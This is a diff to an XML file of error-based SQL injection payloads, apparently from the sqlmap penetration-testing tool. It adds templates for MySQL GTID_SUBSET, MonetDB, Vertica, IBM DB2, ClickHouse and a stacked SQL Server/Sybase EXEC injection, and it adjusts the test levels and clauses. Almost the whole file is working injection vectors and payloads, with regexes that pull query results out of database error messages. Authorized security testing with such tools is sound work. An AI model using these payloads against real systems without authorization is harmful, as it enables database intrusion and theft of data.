@@ -92,6 +92,46 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>AND GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>OR GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)</title>
         <stype>2</stype>
         <level>5</level>
@@ -135,7 +175,7 @@
     <test>
         <title>MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
         <stype>2</stype>
-        <level>1</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
@@ -159,7 +199,7 @@
     <test>
         <title>MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
         <stype>2</stype>
-        <level>1</level>
+        <level>2</level>
         <risk>3</risk>
         <clause>1,2,3,8,9</clause>
         <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
@@ -184,7 +224,7 @@
     <test>
         <title>MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>1</level>
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
@@ -208,7 +248,7 @@
     <test>
         <title>MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>1</level>
         <risk>3</risk>
         <clause>1,2,3,8,9</clause>
         <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
@@ -282,7 +322,7 @@
     <test>
         <title>MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
@@ -307,7 +347,7 @@
         <!-- It does not work against ORDER BY or GROUP BY clause -->
         <title>MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>1</where>
@@ -332,7 +372,7 @@
     <test>
         <title>MySQL OR error-based - WHERE or HAVING clause (FLOOR)</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>2</where>
@@ -404,7 +444,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -425,7 +464,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -446,7 +484,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -467,7 +504,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -488,7 +524,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -509,7 +544,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -672,7 +706,7 @@
         <stype>2</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>1,9</clause>
+        <clause>1</clause>
         <where>1</where>
         <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
@@ -689,9 +723,9 @@
     <test>
         <title>Firebird OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>3</risk>
-        <clause>1,9</clause>
+        <clause>1</clause>
         <where>2</where>
         <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
         <request>
@@ -704,6 +738,159 @@
             <dbms>Firebird</dbms>
         </details>
     </test>
+
+    <test>
+        <title>MonetDB AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MonetDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MonetDB OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN CODE(49) ELSE CODE(48) END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MonetDB</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Vertica AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Vertica OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>2</where>
+        <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::varchar||'[DELIMITER_STOP]' AS NUMERIC)</vector>
+        <request>
+            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN BITCOUNT(BITSTRING_TO_BINARY('1')) ELSE BITCOUNT(BITSTRING_TO_BINARY('0')) END))::varchar||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Vertica</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 AND error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 OR error-based - WHERE or HAVING clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>2</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND [RANDNUM]=('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>AND [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>OR [RANDNUM]=('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access,
          and SAP MaxDB - no known techniques at this time
@@ -778,6 +965,26 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.6 error-based - Parameter replace (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3,9</clause>
+        <where>3</where>
+        <vector>GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.7.8 error-based - Parameter replace (JSON_KEYS)</title>
         <stype>2</stype>
         <level>5</level>
@@ -800,7 +1007,7 @@
     <test>
         <title>MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</title>
         <stype>2</stype>
-        <level>1</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
@@ -848,7 +1055,7 @@
     <test>
         <title>MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3,9</clause>
         <where>3</where>
@@ -924,7 +1131,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -945,7 +1151,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -984,6 +1189,25 @@
         </response>
         <details>
             <dbms>Firebird</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>IBM DB2 error-based - Parameter replace</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
         </details>
     </test>
     <!-- End of error-based tests - Parameter replace -->
@@ -1030,6 +1254,26 @@
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,GTID_SUBSET(CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM])</vector>
+        <request>
+            <payload>,GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.6</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)</title>
         <stype>2</stype>
         <level>5</level>
@@ -1052,7 +1296,7 @@
     <test>
         <title>MySQL &gt;= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)</title>
         <stype>2</stype>
-        <level>3</level>
+        <level>4</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1072,7 +1316,7 @@
     <test>
         <title>MySQL &gt;= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)</title>
         <stype>2</stype>
-        <level>4</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1112,7 +1356,7 @@
     <test>
         <title>MySQL &gt;= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)</title>
         <stype>2</stype>
-        <level>2</level>
+        <level>3</level>
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
@@ -1128,7 +1372,6 @@
             <dbms_version>&gt;= 4.1</dbms_version>
         </details>
     </test>
-
 
     <test>
         <title>PostgreSQL error-based - ORDER BY, GROUP BY clause</title>
@@ -1185,7 +1428,6 @@
         <details>
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
-            <os>Windows</os>
         </details>
     </test>
 
@@ -1213,7 +1455,7 @@
         <stype>2</stype>
         <level>5</level>
         <risk>1</risk>
-        <clause>2,3</clause>
+        <clause>3</clause>
         <where>1</where>
         <vector>,(SELECT [RANDNUM]=('[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]'))</vector>
         <request>
@@ -1226,9 +1468,51 @@
             <dbms>Firebird</dbms>
         </details>
     </test>
+
+    <test>
+        <title>IBM DB2 error-based - ORDER BY clause</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>3</clause>
+        <where>1</where>
+        <vector>,RAISE_ERROR('70001','[DELIMITER_START]'||([QUERY])||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>,RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>IBM DB2</dbms>
+        </details>
+    </test>
     <!--
          TODO: if possible, add payload for SQLite, Microsoft Access
          and SAP MaxDB - no known techniques at this time
     -->
     <!-- End of error-based tests - ORDER BY, GROUP BY clause -->
+
+    <!-- Error-based tests - stacking -->
+    <test>
+        <title>Microsoft SQL Server/Sybase error-based - Stacking (EXEC)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1-8</clause>
+        <where>1</where>
+        <vector>;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]');EXEC @[RANDSTR]</vector>
+        <request>
+            <payload>;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]');EXEC @[RANDSTR]</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>Microsoft SQL Server</dbms>
+            <dbms>Sybase</dbms>
+        </details>
+    </test>
+    <!-- End of error-based tests - stacking -->
 </root>
